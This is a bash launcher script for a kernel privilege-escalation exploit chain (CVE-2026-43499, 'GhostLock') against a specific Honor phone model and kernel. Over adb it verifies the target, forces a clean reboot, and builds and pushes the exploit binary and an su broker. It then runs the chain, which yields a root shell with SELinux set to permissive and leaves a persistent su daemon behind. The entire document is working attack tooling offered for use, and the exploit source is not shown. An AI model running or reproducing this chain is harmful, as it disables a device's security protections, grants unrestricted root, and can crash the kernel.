#!/usr/bin/env bash
# One-command root for the Honor Magic8 Pro Air LDY-AN00 (CVE-2026-43499).
#
#   ./root.sh
#
# Checks the target, reboots when a clean boot is required, builds the exploit
# from source (into a cache outside this repository), pushes it, and hands the
# terminal to the on-device launcher.  After 1-6 minutes the prompt becomes:
#
#   HNLDY-M:/ #      uid=0(root), SELinux permissive, context u:r:kernel:s0
#
# It also starts a root su daemon: after this command, any other adb shell
# can run /data/local/tmp/su (or /data/local/tmp/su -c 'id') for root,
# without rerunning the exploit.
#
# Root is per-boot and RAM-only.  Rerun ./root.sh after every reboot.
set -euo pipefail
cd "$(dirname "$0")"

REF_SHA="d0d72f0379d91971152cac7a970001c6b1057296ea5b38b87866baa21e4de9ab"
MODEL_EXPECT="LDY-AN00"
KERNEL_EXPECT="6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k"
CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/ghostlock-ldy-an00"
BIN_HOST="$CACHE_DIR/device_root_aarch64"
SU_HOST="$CACHE_DIR/su"
BIN_DEV="/data/local/tmp/device_root"
SU_DEV="/data/local/tmp/su"
LAUNCHER_DEV="/data/local/tmp/ldy_rootshell.sh"
ROOTSH_DEV="/data/local/tmp/rootsh.sh"
STATE_FILE="$CACHE_DIR/root-state"

SERIAL=""
REBOOT_MODE="auto"      # auto | yes | no
FORCE=0

usage() {
    cat <<EOF
Usage: ./root.sh [options]

Options:
  -s, --serial SERIAL   select the adb device (when several are connected)
      --reboot          always reboot before running the chain
      --no-reboot       never reboot (only safe if no chain ran on this boot)
      --force           bypass the model/kernel version checks (dangerous)
  -h, --help            show this help
EOF
}

die() { echo "error: $*" >&2; exit 1; }
log() { echo "[*] $*"; }

while [ $# -gt 0 ]; do
    case "$1" in
        -s|--serial) [ $# -ge 2 ] || die "--serial needs an argument"; SERIAL="$2"; shift 2 ;;
        --reboot) REBOOT_MODE="yes"; shift ;;
        --no-reboot) REBOOT_MODE="no"; shift ;;
        --force) FORCE=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *) die "unknown option '$1' (see --help)" ;;
    esac
done

command -v adb >/dev/null 2>&1 || die "adb not found; install Android platform-tools"
ADB=(adb)
[ -n "$SERIAL" ] && ADB+=(-s "$SERIAL")

"${ADB[@]}" get-state >/dev/null 2>&1 || die "no authorized adb device.
  1. Connect the phone by USB and enable Developer options > USB debugging.
  2. Accept the RSA key prompt on the phone.
  3. Verify with: adb devices"

model=$("${ADB[@]}" shell getprop ro.product.model 2>/dev/null | tr -d '\r' || true)
kernel=$("${ADB[@]}" shell uname -r 2>/dev/null | tr -d '\r' || true)
if [ "$FORCE" -ne 1 ]; then
    [ "$model" = "$MODEL_EXPECT" ] || die "device model '$model' != '$MODEL_EXPECT'.
This exploit is specific to the Honor Magic8 Pro Air LDY-AN00.  Use --force
only if you understand that the addresses and offsets will not match."
    [ "$kernel" = "$KERNEL_EXPECT" ] || die "kernel '$kernel' != '$KERNEL_EXPECT'.
The exploit's addresses, BTF offsets, and SELinux layout are for the exact
kernel above.  Use --force only if you know the kernel is compatible."
fi
log "target: $model / $kernel"

# One chain per boot.  A completed chain parks its process with the dead
# waiter still linked in a scratch-lock slot; a second chain in the same
# boot can BUG in rt_mutex_top_waiter.  Remember which boot_id has run.
cur_boot=$("${ADB[@]}" shell cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r' || true)
[ -n "$cur_boot" ] || die "could not read the boot id from the phone"
last_boot=""
[ -f "$STATE_FILE" ] && last_boot=$(cat "$STATE_FILE" 2>/dev/null || true)

need_reboot=0
case "$REBOOT_MODE" in
    yes) need_reboot=1 ;;
    no)  need_reboot=0 ;;
    auto)
        if [ -z "$last_boot" ]; then
            log "no previous run recorded; starting from a clean boot"
            need_reboot=1
        elif [ "$last_boot" = "$cur_boot" ]; then
            log "a chain was already started on this boot; a reboot is required"
            need_reboot=1
        else
            log "the phone has rebooted since the last run; no extra reboot needed"
        fi
        ;;
esac

# A fresh boot is Enforcing.  Permissive means a chain (or at least the
# SELinux flip) already ran on this boot.  Never start a second chain
# without a reboot: scratch-slot reuse can BUG the kernel.
enforcing=$("${ADB[@]}" shell getenforce 2>/dev/null | tr -d '\r' || true)
if [ "$enforcing" != "Enforcing" ]; then
    log "SELinux is '$enforcing' (not Enforcing); this boot already ran a chain"
    [ "$REBOOT_MODE" = "no" ] && die "--no-reboot was given, but this is not a clean Enforcing boot; reboot first"
    need_reboot=1
fi

if [ "$need_reboot" -eq 1 ]; then
    log "rebooting the phone (clean boot)"
    old_boot="$cur_boot"
    "${ADB[@]}" reboot
    "${ADB[@]}" wait-for-device || true
    booted=0
    # wait-for-device can return against the still-running old boot; require
    # a changed boot_id as well as sys.boot_completed=1.
    for _ in $(seq 1 90); do
        nb=$("${ADB[@]}" shell cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r' || true)
        b=$("${ADB[@]}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r' || true)
        if [ -n "$nb" ] && [ "$nb" != "$old_boot" ] && [ "$b" = "1" ]; then
            booted=1
            cur_boot="$nb"
            break
        fi
        sleep 2
    done
    [ "$booted" -eq 1 ] || die "the phone did not finish booting (boot_id unchanged or sys.boot_completed != 1)"
    sleep 2
fi

log "building the exploit and the su broker from source"
./build.sh "$BIN_HOST" "$SU_HOST"
sha=$(sha256sum "$BIN_HOST" | awk '{print $1}')
su_sha=$(sha256sum "$SU_HOST" | awk '{print $1}')
if [ "$sha" != "$REF_SHA" ]; then
    echo "[!] note: the built exploit hash differs from the phone-verified" >&2
    echo "[!] reference (toolchain difference); using the local build." >&2
fi

log "pushing the exploit, su broker, and launchers"
"${ADB[@]}" push "$BIN_HOST" "$BIN_DEV" >/dev/null
"${ADB[@]}" push "$SU_HOST" "$SU_DEV" >/dev/null
"${ADB[@]}" push device/rootsh.sh "$ROOTSH_DEV" >/dev/null
"${ADB[@]}" push device/ldy_rootshell.sh "$LAUNCHER_DEV" >/dev/null
"${ADB[@]}" shell "chmod 755 $BIN_DEV $SU_DEV $ROOTSH_DEV $LAUNCHER_DEV" >/dev/null

dev_sha=$("${ADB[@]}" shell "sha256sum $BIN_DEV 2>/dev/null" | tr -d '\r' | awk '{print $1}' || true)
if [ -n "$dev_sha" ] && [ "$dev_sha" != "$sha" ]; then
    die "on-device exploit hash $dev_sha != host hash $sha (transfer problem)"
fi
su_dev_sha=$("${ADB[@]}" shell "sha256sum $SU_DEV 2>/dev/null" | tr -d '\r' | awk '{print $1}' || true)
if [ -n "$su_dev_sha" ] && [ "$su_dev_sha" != "$su_sha" ]; then
    die "on-device su hash $su_dev_sha != host hash $su_sha (transfer problem)"
fi

# Mark this boot as used before the chain starts, so an interrupted run is
# still detected next time.
printf '%s\n' "$cur_boot" > "$STATE_FILE"

cat <<'EOF'

===============================================================================
 GhostLock chain starting now. This takes 1-6 minutes.
 Leave this terminal open. When it finishes the prompt becomes:

     HNLDY-M:/ #          (uid=0(root), SELinux permissive)

 'id' will report uid=0(root), and SELinux is permissive until the next
 reboot.  Root is per-boot and RAM-only; rerun ./root.sh after every reboot.

 After the prompt appears, any other adb shell can also get root:
     /data/local/tmp/su            (interactive root shell)
     /data/local/tmp/su -c 'id'    (one root command)

 Use the session promptly: a parked exploit state can BUG the kernel after
 several minutes (known issue), so reboot when you are done.
===============================================================================

EOF

exec "${ADB[@]}" shell -t "$LAUNCHER_DEV"
